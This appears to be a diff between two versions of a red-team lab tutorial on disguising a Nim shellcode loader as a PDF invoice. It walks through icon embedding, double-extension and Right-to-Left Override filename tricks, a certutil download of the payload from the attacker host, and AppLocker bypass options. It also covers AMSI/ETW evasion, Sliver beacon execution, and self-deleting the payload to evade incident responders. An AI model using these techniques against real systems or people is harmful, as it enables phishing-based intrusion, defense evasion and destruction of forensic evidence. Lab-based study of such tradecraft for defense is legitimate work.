+- The PDF icon (embedded via `.res` file) makes the binary visually indistinguishable from a document in Windows Explorer.
+- Windows hides known file extensions by default. `Invoice_June2026.pdf.exe` displays as `Invoice_June2026.pdf` with a PDF icon. The target has no indication they are running an executable.
+- Launching a decoy document immediately normalizes the user's experience. If they happen to check Task Manager, they see a PDF reader process started, which is exactly what they expected.
+- The implant execution sequence is identical to Methods 1 and 2. All the same evasion techniques apply.
 
 ### 6.3 Prerequisites: Sliver, Shellcode, and HTTP Server
 
@@ -1661,9 +1577,9 @@ Both should return `200`. If either returns `404`, the file does not exist in `/
 
 ---
 
-### 6.4 Prepare the Decoy PDF
+### 6.4 Prepare the Decoy Document
 
-Use any real PDF you already have. The content does not matter for the lab. In a real engagement, the document should match the pretext convincingly.
+The decoy must be a valid PDF that opens without errors. The content is irrelevant for the lab. In a real engagement, the decoy content must match the phishing pretext. If the lure is an invoice, the PDF should look like a real invoice. A blank or error-producing document would raise suspicion immediately.
 
 Copy your PDF to the expected path:
 
@@ -1697,9 +1613,9 @@ file /tmp/decoy_invoice.pdf
 
 If `file` does not say `PDF document`, the conversion failed. Check which of the above tools is available on your Kali instance and retry.
 
-### 6.4 Convert the PDF to a Nim Byte Array
+### 6.5 Convert the PDF to a Nim Byte Array
 
-You need to embed the PDF inside your Nim binary as raw bytes. Create a Python script to convert the PDF to a Nim array:
+To embed the decoy PDF directly inside the binary (rather than fetching it from Kali at runtime), convert it to a Nim byte array. The loader can then write these bytes to disk and open them without any network connection for the decoy step. For this lab we fetch it from Kali at runtime to keep the binary smaller, but this script is provided for reference:
 
 ```bash
 nano /tmp/pdf_to_nim.py
@@ -1727,9 +1643,9 @@ python3 /tmp/pdf_to_nim.py > /tmp/decoy_bytes.nim
 
 This creates a file containing the full PDF as a Nim byte array. You will paste this into your loader.
 
-### 6.5 Create a PDF Icon Resource File
+### 6.6 Create a PDF Icon Resource File
 
-Windows executables can have custom icons embedded in them. To make the loader look like a PDF in Windows Explorer, you need a PDF-like icon compiled into a `.res` resource file.
+Windows PE files can contain embedded icon resources. Explorer uses the icon embedded in the binary when displaying the file. By embedding a PDF-style icon and using the double-extension filename trick, the loader is visually indistinguishable from a real PDF document to the target user.
 
 Create the icon resource script:
 
@@ -1777,7 +1693,7 @@ x86_64-w64-mingw32-windres pdf_icon.rc -O coff -o pdf_icon.res
 
 This creates `pdf_icon.res` which you will link into your Nim binary during compilation.
 
-### 6.6 Write the Fake PDF Loader
+### 6.7 Write the Masqueraded Loader
 
 ```bash
 nano /tmp/fakepdf_loader.nim
@@ -1940,9 +1856,9 @@ when isMainModule:
   runShellcode()
 ```
 
-### 6.7 Compile With the PDF Icon
+### 6.8 Compile With the PDF Icon
 
-This is the key step. You compile the Nim loader with the PDF icon embedded, and as a **GUI app** (not console) so no command prompt window flashes when the user double-clicks it:
+The binary must be compiled as a GUI application to suppress the console window. It must also link the icon resource file so Windows Explorer displays the PDF icon.
 
 ```bash
 nim c \
@@ -1957,45 +1873,47 @@ nim c \
   /tmp/fakepdf_loader.nim
 ```
 
-Key differences from previous compiles:
+Key differences from Method 1:
 
-| Flag | Why |
+| Flag | Purpose |
 |------|-----|
-| `--app:gui` | Compiles as a GUI application. No console window appears when the user runs it. This is critical. If a black command prompt flashes, the user knows something is wrong. |
-| `--passL:/tmp/pdf_icon.res` | Links the PDF icon resource into the binary. Windows Explorer shows this icon for the file. |
-| `-o:Invoice_June2026.pdf.exe` | The filename ends with `.pdf.exe`. See the next section for why. |
+| `--app:gui` | Compiles as a GUI application. No console window appears when the target executes it. A flashing CMD window is an immediate OPSEC failure. |
+| `--passL:/tmp/pdf_icon.res` | Links the icon resource into the PE. Explorer uses this icon when displaying the file. |
+| `-o:Invoice_June2026.pdf.exe` | The double extension. Combined with Windows' default extension-hiding behavior, Explorer displays this as `Invoice_June2026.pdf`. |
 
-Check the output before doing any renaming:
+Verify the output:
 
 ```bash
 ls -la "/tmp/Invoice_June2026.pdf.exe"
 file "/tmp/Invoice_June2026.pdf.exe"
 ```
 
-### 6.8 Why the Filename Trick Works
+### 6.9 The Filename Masquerading Techniques
 
-Windows hides file extensions by default. This is a setting called "Hide extensions for known file types" and it is ON by default on every Windows installation.
+**Double extension with extension hiding:**
 
-When this setting is on:
-- `report.docx` shows as `report` with a Word icon
-- `photo.jpg` shows as `photo` with an image icon
-- `Invoice_June2026.pdf.exe` shows as `Invoice_June2026.pdf` with a PDF icon
+Windows hides known file extensions by default ("Hide extensions for known file types" is enabled out of the box). With this setting:
+- `Invoice_June2026.pdf.exe` is displayed as `Invoice_June2026.pdf` with whatever icon is embedded in the binary.
 
-The user sees `Invoice_June2026.pdf` with a PDF icon. They have no reason to suspect it is an executable.
+Combined with a PDF icon resource, the file is visually identical to a real PDF. This works against the vast majority of corporate users.
 
-If the target has extensions shown (some power users do), you can use the **Right-to-Left Override (RLO)** Unicode character trick:
+**Right-to-Left Override (RLO) Unicode trick:**
+
+If the target machine has extension display enabled (some technical users configure this), the double extension becomes visible. The RLO technique handles this case.
+
+The Unicode character U+202E (Right-to-Left Override) reverses the display direction of all text that follows it. Inserting RLO before `fdp.exe` causes those characters to display as `exe.pdf`. The OS still treats the file as an `.exe`. The MITRE ATT&CK technique reference is T1036.002 (Masquerading: Right-to-Left Override).
 
 ```
-Invoice_June2026[RLO]fdp.exe
+Invoice_June2026[U+202E]fdp.exe
 ```
 
-The RLO character (`U+202E`) reverses the text direction of everything after it. So `fdp.exe` displays as `exe.pdf`. The full filename appears as:
+Displays in Explorer as:
 
 ```
 Invoice_June2026exe.pdf
 ```
 
-But it is still an `.exe` file. This trick is well-documented and works on Windows 11. To insert the RLO character on Linux:
+But the filesystem sees it as an `.exe` and executes it accordingly. To apply the rename on Linux:
 
 ```bash
 # Rename using printf with the Unicode escape
@@ -2011,11 +1929,9 @@ file /tmp/Invoice_June2026*
 
 You will see the renamed file. The `file` command will still confirm it is a `PE32+ executable`.
 
-For the lab, the simple `.pdf.exe` trick is sufficient since Windows hides extensions by default. If you did the RLO rename, note that the HTTP server serves it under the new filename — update the download URL on the victim accordingly.
+For the lab, the `.pdf.exe` double extension is sufficient because Windows hides extensions by default. If you did the RLO rename, the file is served under its new name from the HTTP server. Update the download URL on the target machine accordingly.
 
-### 6.9 Deliver to the Victim
-
-Copy the fake PDF and the decoy PDF to Kali's HTTP server:
+### 6.10 Deliver to the Target
 
 ```bash
 # Check which filename is in /tmp (depends on whether you did the RLO rename)
@@ -2038,15 +1954,15 @@ Or use certutil to put it in a trusted AppLocker path:
 certutil.exe -urlcache -split -f http://192.168.10.10:8888/Invoice_June2026.pdf.exe C:\Windows\Temp\Invoice_June2026.pdf.exe
 ```
 
-### 6.10 AppLocker Consideration
+### 6.11 AppLocker Bypass Considerations for Method 3
 
-AppLocker will BLOCK the .exe from running if it is in Downloads (not a trusted path). You have two options:
+AppLocker blocks the executable if it is not in a trusted path. `Downloads`, `Desktop`, and user profile directories are not in the default allow list.
 
-**Option A:** Drop it in `C:\Windows\Temp\` (AppLocker trusted path). But this is unrealistic for a phishing scenario because no user downloads invoices to `C:\Windows\Temp\`.
+**Option A:** Place the payload in `C:\Windows\Temp\` and execute from there. This bypasses AppLocker but breaks the phishing pretext realism since no legitimate user downloads an invoice to a system temp directory.
 
-**Option B:** Combine Method 3 with Method 2 (DLL sideloading). Instead of delivering a standalone EXE, deliver the DLL sideloading chain (BGInfo + version.dll) inside a ZIP. The "PDF" pretext becomes the email subject. The user downloads the ZIP, extracts it, runs the "BGInfo Setup" or whatever pretext you use. This bypasses AppLocker because DLL rules are off.
+**Option B:** Combine Method 3's social engineering pretext with Method 2's DLL sideloading delivery. Package `Bginfo64.exe` and `version.dll` inside a ZIP archive with a convincing name. The phishing lure instructs the target to extract and run the contained setup binary. AppLocker's default DLL rules do not apply. The payload executes inside `Bginfo64.exe`.
 
-**Option C:** If AppLocker is not enforced on the target (many real-world environments only have Defender, not AppLocker), the user just double-clicks the file from Downloads and it runs. For the lab, you already have AppLocker configured, so use Option A.
+**Option C:** Many real-world environments enforce Defender but not AppLocker. In those environments, the payload runs from `Downloads` or `Desktop` without restriction. For this lab where AppLocker is enforced, use Option A.
 
 For the lab:
 
@@ -2055,14 +1971,13 @@ For the lab:
 C:\Windows\Temp\Invoice_June2026.pdf.exe
 ```
 
-### 6.11 What Happens When the User Runs It
+### 6.12 Execution Sequence on the Target
 
-1. No console window appears (compiled as GUI app)
-2. Within 1 second, the real `decoy_invoice.pdf` opens in the default PDF reader
-3. The user sees a professional-looking invoice. They think they opened a PDF.
-4. In the background, hardware breakpoints are set on AMSI and ETW (no memory modification)
-5. The Sliver beacon shellcode is fetched from Kali, decoded, and executed via callback
-6. Beacon fires
+1. No console window appears. The binary is compiled as a GUI application.
+2. Within one second, `ShellExecute` opens the decoy PDF in the default PDF reader. The target sees a document.
+3. After a 1-second delay, hardware breakpoints are set on `AmsiScanBuffer` and `EtwEventWrite` via CPU debug registers.
+4. The encoded shellcode is fetched from Kali over HTTP, XOR-decoded in memory, written to a `PAGE_READWRITE` region, permission-flipped to `PAGE_EXECUTE_READ`, and executed via `EnumSystemLocalesA` callback.
+5. The Sliver beacon makes its first check-in on port 443.
 
 Check Sliver:
 
@@ -2079,16 +1994,16 @@ sliver (BEACON_NAME) > ps
 
 Wait for the next check-in. In the process list you will see `Invoice_June2026.pdf.exe`. That is the process the beacon is running inside.
 
-### 6.12 OPSEC Note for Method 3
+### 6.13 OPSEC Assessment for Method 3
 
-What you leave behind:
-- `Invoice_June2026.pdf.exe` on disk (wherever the user saved it)
-- `Invoice_June2026.pdf` in the user's Temp folder (the dropped decoy)
-- Prefetch entry for the EXE
-- Network connections to `192.168.10.10:8888` (fetching decoy + beacon shellcode) and `:443` (C2 check-ins)
-- A PDF reader process starting right after your EXE started (Process Monitor or Sysmon would show the parent-child relationship)
+Artifacts after execution:
+- The payload binary on disk (wherever the target saved it).
+- The decoy PDF in `%TEMP%`.
+- Prefetch entry for the payload EXE.
+- Network flow logs: two HTTP connections to `192.168.10.10:8888` (fetching decoy and shellcode), then periodic HTTPS check-ins to port 443.
+- Sysmon Event ID 1 (Process Create): the PDF reader process was launched with the payload EXE as its parent, not Explorer. This parent-child relationship is anomalous and is a reliable detection signal for defenders running Sysmon.
 
-The biggest OPSEC risk: a defender checking Sysmon logs will see that a PDF reader was launched BY your executable, not by Explorer. That parent-child process relationship is abnormal and is a detection signal. In a real engagement, you would self-delete the EXE after execution using a scheduled task or a batch script that waits and deletes.
+The parent-child process anomaly is the most significant OPSEC risk. In a real engagement, you would schedule the self-deletion of the payload using a `cmd /c ping -n 3 127.0.0.1 & del` command launched as a detached process after execution, removing the binary before the incident response team can retrieve it.
 
 To clean up after the beacon is stable:
 
@@ -2101,21 +2016,21 @@ sliver (BEACON_NAME) > execute -o cmd.exe /c del "%TEMP%\Invoice_June2026.pdf"
 
 ## Summary
 
-You now have three working methods to land a Sliver beacon past Defender and AppLocker:
+All three methods produce the same end state: a live Sliver beacon running as `CORP\vamsi` on `WORKSTATION01`, past Defender and AppLocker. The difference is the approach and the resulting detection risk.
 
-| Method | How | Best For | Stealth |
-|--------|-----|----------|---------|
-| Method 1: Nim EXE | Drop to C:\Windows\Temp, run directly | Quick lab testing, environments with weak monitoring | Medium |
-| Method 2: DLL Sideload | BGInfo loads your version.dll proxy | Environments with EDR, need to run inside a trusted process | High |
-| Method 3: Fake PDF | EXE with PDF icon opens real PDF as decoy | Phishing delivery, social engineering scenarios | High (user sees nothing suspicious) |
+| Method | Technique | MITRE ATT&CK | Detection Risk |
+|--------|-----------|--------------|----------------|
+| Method 1: Standalone EXE | Custom loader in AppLocker-trusted path | T1059, T1027 | Medium - unknown binary making network connections |
+| Method 2: DLL Sideloading | Malicious DLL loaded by signed Microsoft binary | T1574.002 | Lower - implant runs inside trusted process, no DLL rules |
+| Method 3: Masqueraded EXE | Payload disguised as document, opens real decoy | T1036.002, T1204.002 | Context-dependent - effective against non-technical users, anomalous parent-child process relationship |
 
-**Method 1** is your fast option.
+**Method 1** is the fastest path to a beacon. Use it in lab environments or targets with minimal monitoring.
 
-**Method 2** is your stealth option against Defender and AppLocker.
+**Method 2** is operationally stronger. The implant runs inside a signed Microsoft process, AppLocker is not a factor, and ETW telemetry is suppressed. Use this when EDR is present.
 
-**Method 3** is your social engineering option when the initial access depends on tricking a human.
+**Method 3** is the phishing delivery vector. It is a social engineering technique, not a technical bypass. Its effectiveness depends on the target's vigilance and the quality of the phishing pretext. Combine with Method 2's delivery mechanism when AppLocker enforcement is strict.
 
-All three give you the same result: a live Sliver beacon as `CORP\vamsi` that you will use in every module from here on.
+The beacon you have established is the foundation for all subsequent modules.
 
 ---
 
